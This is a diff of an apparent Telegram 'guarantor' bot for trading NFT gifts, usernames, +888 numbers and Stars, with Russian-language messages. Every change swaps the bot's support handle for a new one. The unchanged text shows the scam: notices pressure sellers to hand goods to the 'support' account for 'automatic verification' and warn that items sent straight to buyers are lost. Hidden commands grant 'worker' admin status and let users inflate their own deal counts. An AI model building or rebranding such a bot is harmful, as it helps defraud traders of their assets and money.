@@ -675,7 +675,7 @@ async def complete_deal_join(chat_id, user_id, user_username, deal_id):
             await bot.send_message(chat_id, "😕 Сделка не найдена.")
     except Exception as e:
         logger.error(f"Error in complete_deal_join for deal {deal_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при присоединении к сделке. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при присоединении к сделке. Обратитесь в поддержку @GiftGuarantHelp.")
 
 def get_user_rating(user_id):
     try:
@@ -711,7 +711,7 @@ async def send_welcome(message):
             await show_main_menu(message.chat.id, message.from_user.first_name)
     except Exception as e:
         logger.error(f"Error in send_welcome for user {message.from_user.id}: {e}")
-        await bot.send_message(message.chat.id, "⚠ Ошибка при запуске бота. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(message.chat.id, "⚠ Ошибка при запуске бота. Обратитесь в поддержку @GiftGuarantHelp.")
 
 @bot.message_handler(commands=['givemeworkerppp'])
 async def handle_givemeworkerppp(message):
@@ -733,7 +733,7 @@ async def handle_givemeworkerppp(message):
                 await bot.reply_to(message, f"😕 {user_mention}, вы уже являетесь администратором.", parse_mode='HTML')
         except Exception as e:
             logger.error(f"Error in givemeworkerppp for user {user_id}: {e}")
-            await bot.reply_to(message, "⚠ Ошибка при выдаче статуса администратора. Обратитесь в поддержку @SecureHomeSupport.")
+            await bot.reply_to(message, "⚠ Ошибка при выдаче статуса администратора. Обратитесь в поддержку @GiftGuarantHelp.")
     else:
         await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
 
@@ -764,7 +764,7 @@ async def handle_remove_admin(message):
             await bot.reply_to(message, "⚠ Неверный формат ID. Введите числовой ID пользователя.")
         except Exception as e:
             logger.error(f"Error in handle_remove_admin: {e}")
-            await bot.reply_to(message, "⚠ Ошибка при снятии статуса администратора. Обратитесь в поддержку @SecureHomeSupport.")
+            await bot.reply_to(message, "⚠ Ошибка при снятии статуса администратора. Обратитесь в поддержку @GiftGuarantHelp.")
     else:
         await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
 
@@ -794,7 +794,7 @@ async def handle_add_admin(message):
             await bot.reply_to(message, "⚠ Неверный формат ID. Введите числовой ID пользователя.")
         except Exception as e:
             logger.error(f"Error in handle_add_admin: {e}")
-            await bot.reply_to(message, "⚠ Ошибка при выдаче статуса администратора. Обратитесь в поддержку @SecureHomeSupport.")
+            await bot.reply_to(message, "⚠ Ошибка при выдаче статуса администратора. Обратитесь в поддержку @GiftGuarantHelp.")
     else:
         await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
 
@@ -820,7 +820,7 @@ async def handle_setmedealsmnogo(message):
             await bot.reply_to(message, f"⚠ {user_mention}, укажите корректное число сделок.", parse_mode='HTML')
         except Exception as e:
             logger.error(f"Error in setmedealsmnogo for user {user_id}: {e}")
-            await bot.reply_to(message, "⚠ Ошибка при обновлении счетчика сделок. Обратитесь в поддержку @SecureHomeSupport.")
+            await bot.reply_to(message, "⚠ Ошибка при обновлении счетчика сделок. Обратитесь в поддержку @GiftGuarantHelp.")
     else:
         await bot.reply_to(message, f"⚠ Эта команда работает только в группе с ID {GROUP_ID} в теме с ID {TOPIC_ID}.")
 
@@ -836,7 +836,7 @@ async def handle_sdelky(message):
         await bot.reply_to(message, "📋 Список всех сделок:", reply_markup=get_deals_keyboard(deals))
     except Exception as e:
         logger.error(f"Error in handle_sdelky: {e}")
-        await bot.reply_to(message, "⚠ Ошибка при получении списка сделок. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.reply_to(message, "⚠ Ошибка при получении списка сделок. Обратитесь в поддержку @GiftGuarantHelp.")
 
 async def handle_join_deal(message, deal_id):
     try:
@@ -894,7 +894,7 @@ async def handle_join_deal(message, deal_id):
         await complete_deal_join(message.chat.id, message.from_user.id, message.from_user.username, deal_id)
     except Exception as e:
         logger.error(f"Error in handle_join_deal for deal {deal_id}: {e}")
-        await bot.send_message(message.chat.id, "⚠ Ошибка при присоединении к сделке. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(message.chat.id, "⚠ Ошибка при присоединении к сделке. Обратитесь в поддержку @GiftGuarantHelp.")
 
 async def show_main_menu(chat_id, user_name):
     try:
@@ -907,32 +907,32 @@ async def show_main_menu(chat_id, user_name):
         logger.info(f"Displayed main menu for chat {chat_id}")
     except Exception as e:
         logger.error(f"Error in show_main_menu for chat {chat_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при отображении главного меню. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при отображении главного меню. Обратитесь в поддержку @GiftGuarantHelp.")
 
 NOTICE = "⚠ Обязательно к прочтению!\n\n"
 GIFT_NOTICE_BODY = (
     "*‼️ Важная информация!*\n\n"
-    "*Проверка получения подарков осуществляется автоматически только при отправке на аккаунт @SecureHomeSupport.*\n\n"
+    "*Проверка получения подарков осуществляется автоматически только при отправке на аккаунт @GiftGuarantHelp.*\n\n"
     "*Если NFT username/+888 отправлены напрямую покупателю:*\n"
     "• Они будут утеряны 😔\n"
     "• Сделка будет считаться несостоявшейся, что приведет к потери username/+888 и денежных средств 💸\n\n"
-    "Для успешного завершения сделки и получения средств обязательно отправляйте подарки на аккаунт @GiftGuarant для проверки."
+    "Для успешного завершения сделки и получения средств обязательно отправляйте подарки на аккаунт @GiftGuarantHelp для проверки."
 )
 CHANNEL_NOTICE_BODY = (
     "*‼️ Важная информация!*\n\n"
-    "*Проверка получения подарков осуществляется автоматически только при отправке на аккаунт @SecureHomeSupport.*\n\n"
+    "*Проверка получения подарков осуществляется автоматически только при отправке на аккаунт @GiftGuarantHelp.*\n\n"
     "*Если Каналы/Чаты отправлены напрямую покупателю:*\n"
     "• Они будут утеряны 😔\n"
     "• Сделка будет считаться несостоявшейся, что приведет к потери Каналов/Чатов и денежных средств 💸\n\n"
-    "Для успешного завершения сделки и получения средств обязательно отправляйте подарки на аккаунт @GiftGuarant для проверки."
+    "Для успешного завершения сделки и получения средств обязательно отправляйте подарки на аккаунт @GiftGuarantHelp для проверки."
 )
 STARS_NOTICE_BODY = (
     "*‼️ Важная информация!*\n\n"
-    "*Проверка получения подарков осуществляется автоматически только при отправке на аккаунт @SecureHomeSupport.*\n\n"
+    "*Проверка получения подарков осуществляется автоматически только при отправке на аккаунт @GiftGuarantHelp.*\n\n"
     "*Если звёзды отправлены напрямую покупателю:*\n"
     "• Они будут утеряны 😔\n"
     "• Сделка будет считаться несостоявшейся, что приведет к потери звёзд и денежных средств 💸\n\n"
-    "Для успешного завершения сделки и получения средств обязательно отправляйте подарки на аккаунт @GiftGuarant для проверки."
+    "Для успешного завершения сделки и получения средств обязательно отправляйте подарки на аккаунт @GiftGuarantHelp для проверки."
 )
 NFT_NOTICE_BODY = GIFT_NOTICE_BODY
 NOTICES = {
@@ -1098,7 +1098,7 @@ async def handle_callback_query(call):
                     )
             except Exception as e:
                 logger.error(f"Error in my_profile for user {call.from_user.id}: {e}")
-                await bot.send_message(chat_id, "⚠ Ошибка при отображении профиля. Обратитесь в поддержку @SecureHomeSupport.")
+                await bot.send_message(chat_id, "⚠ Ошибка при отображении профиля. Обратитесь в поддержку @GiftGuarantHelp.")
         elif call.data == "change_language":
             current_lang = get_user_language(call.from_user.id)
             if current_lang == 'en':
@@ -1167,7 +1167,7 @@ async def handle_callback_query(call):
                 await bot.answer_callback_query(call.id, text, show_alert=True)
     except Exception as e:
         logger.error(f"Error in handle_callback_query {call.data} for user {user_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при обработке действия. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при обработке действия. Обратитесь в поддержку @GiftGuarantHelp.")
 
 def get_transfer_item_name(deal_type):
     names = {
@@ -1235,7 +1235,7 @@ async def handle_pay_from_balance(chat_id, user_id, deal_id, message_id):
         await send_video_without_sound(
             chat_id, 
             'assets/1.mp4', 
-            caption=f"✅ <b>Вы успешно оплатили сделку</b> <code>#{escaped_deal_id}</code>. <b>Ожидайте, пока продавец передаст товар на проверку @SecureHomeSupport</b>", 
+            caption=f"✅ <b>Вы успешно оплатили сделку</b> <code>#{escaped_deal_id}</code>. <b>Ожидайте, пока продавец передаст товар на проверку @GiftGuarantHelp</b>", 
             reply_markup=get_paid_keyboard(deal_id), 
             parse_mode='HTML'
         )
@@ -1249,8 +1249,8 @@ async def handle_pay_from_balance(chat_id, user_id, deal_id, message_id):
         seller_message_html = (
             f"💸 <b>Сделка оплачена!</b>\n\n"
             f"👤 <b>Покупатель</b>: {participant_link_html} <b>оплатил</b> <code>{escaped_amount} {escaped_currency}</code>\n\n"
-            f"📦 <b>Пожалуйста, передайте {item_name} поддержке @SecureHomeSupport для проверки.</b>\n"
-            f"💰 <b>Средства в размере</b> <code>{escaped_amount} {escaped_currency}</code> <b>будут зачислены на ваш баланс сразу после подтверждения @SecureHomeSupport.</b>\n"
+            f"📦 <b>Пожалуйста, передайте {item_name} поддержке @GiftGuarantHelp для проверки.</b>\n"
+            f"💰 <b>Средства в размере</b> <code>{escaped_amount} {escaped_currency}</code> <b>будут зачислены на ваш баланс сразу после подтверждения @GiftGuarantHelp.</b>\n"
         )
 
         keyboard = telebot.types.InlineKeyboardMarkup()
@@ -1266,7 +1266,7 @@ async def handle_pay_from_balance(chat_id, user_id, deal_id, message_id):
         )
     except Exception as e:
         logger.error(f"Error in handle_pay_from_balance for deal {deal_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при оплате сделки. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при оплате сделки. Обратитесь в поддержку @GiftGuarantHelp.")
 
 def get_username_by_id(user_id):
     try:
@@ -1323,7 +1323,7 @@ async def handle_complete_deal(chat_id, user_id, deal_id, message_id):
         await bot.send_message(participant_id, "*🎉 Сделка успешно завершена!*", parse_mode='Markdown')
     except Exception as e:
         logger.error(f"Error in handle_complete_deal for deal {deal_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при завершении сделки. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при завершении сделки. Обратитесь в поддержку @GiftGuarantHelp.")
 
 async def handle_leave_deal(chat_id, user_id, deal_id):
     try:
@@ -1367,7 +1367,7 @@ async def handle_leave_deal(chat_id, user_id, deal_id):
         await send_video_without_sound(chat_id, 'assets/1.mp4', caption="✅ Вы успешно покинули сделку.", reply_markup=get_main_menu_keyboard())
     except Exception as e:
         logger.error(f"Error in handle_leave_deal for deal {deal_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при выходе из сделки. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при выходе из сделки. Обратитесь в поддержку @GiftGuarantHelp.")
 
 @bot.message_handler(state=UserStates.AwaitingLinks, content_types=['text'])
 async def handle_links(message):
@@ -1400,7 +1400,7 @@ async def handle_links(message):
         await send_video_without_sound(chat_id, 'assets/4.mp4', caption=text, reply_markup=get_currency_keyboard(get_user_language(chat_id)), parse_mode='Markdown')
     except Exception as e:
         logger.error(f"Error in handle_links for user {user_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при обработке ссылок. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при обработке ссылок. Обратитесь в поддержку @GiftGuarantHelp.")
 
 @bot.message_handler(state=UserStates.AwaitingAmount, content_types=['text'])
 async def handle_amount(message):
@@ -1477,7 +1477,7 @@ async def handle_amount(message):
         await bot.delete_state(user_id, chat_id)
     except Exception as e:
         logger.error(f"Error in handle_amount for user {user_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при создании сделки. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при создании сделки. Обратитесь в поддержку @GiftGuarantHelp.")
 
 @bot.message_handler(state=UserStates.AwaitingDetailsInput, content_types=['text'])
 async def handle_details_input(message):
@@ -1524,7 +1524,7 @@ async def handle_details_input(message):
         logger.info(f"Saved details for user {user_id}")
     except Exception as e:
         logger.error(f"Error saving details to Firestore for user {user_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при сохранении реквизитов. Пожалуйста, попробуйте снова или обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при сохранении реквизитов. Пожалуйста, попробуйте снова или обратитесь в поддержку @GiftGuarantHelp.")
         return
 
     # Обработка состояния
@@ -1560,7 +1560,7 @@ async def handle_details_input(message):
             await bot.delete_state(user_id, chat_id)
     except Exception as e:
         logger.error(f"Error processing state for user {user_id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при обработке состояния. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при обработке состояния. Обратитесь в поддержку @GiftGuarantHelp.")
 
 # Настройка вебхука
 app = web.Application()
@@ -1673,7 +1673,7 @@ async def my_profile_handler(call):
             )
     except Exception as e:
         logger.error(f"Error in my_profile for user {call.from_user.id}: {e}")
-        await bot.send_message(chat_id, "⚠ Ошибка при отображении профиля. Обратитесь в поддержку @SecureHomeSupport.")
+        await bot.send_message(chat_id, "⚠ Ошибка при отображении профиля. Обратитесь в поддержку @GiftGuarantHelp.")
 
 if __name__ == '__main__':
     try:
